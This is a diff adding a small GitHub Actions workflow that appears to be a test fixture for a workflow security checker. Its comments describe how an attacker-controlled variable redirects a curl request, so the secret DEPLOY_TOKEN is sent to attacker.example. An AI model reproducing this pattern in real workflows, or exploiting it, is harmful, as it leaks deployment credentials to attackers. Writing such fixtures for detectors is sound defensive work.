@@ -1,0 +1,18 @@
+# situation: A step sends a request with curl and the secret DEPLOY_TOKEN to
+#   the host env[vars.NAME] names.
+# reason: the name of the env is not known, and the env has what steps set
+#   at run time.
+# cause: the rule reads an env by its name.
+# attack: the attacker makes the value attacker.example, where the value
+#   comes from what the attacker writes.
+# attack-run-behavior: curl sends the request with the secret to
+#   attacker.example.
+on: issues
+jobs:
+  j:
+    runs-on: ubuntu-latest
+    env:
+      DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
+    steps:
+      - run: |
+          curl -fsS -H "Authorization: Bearer $DEPLOY_TOKEN" "https://${{ env[vars.NAME] }}/status"
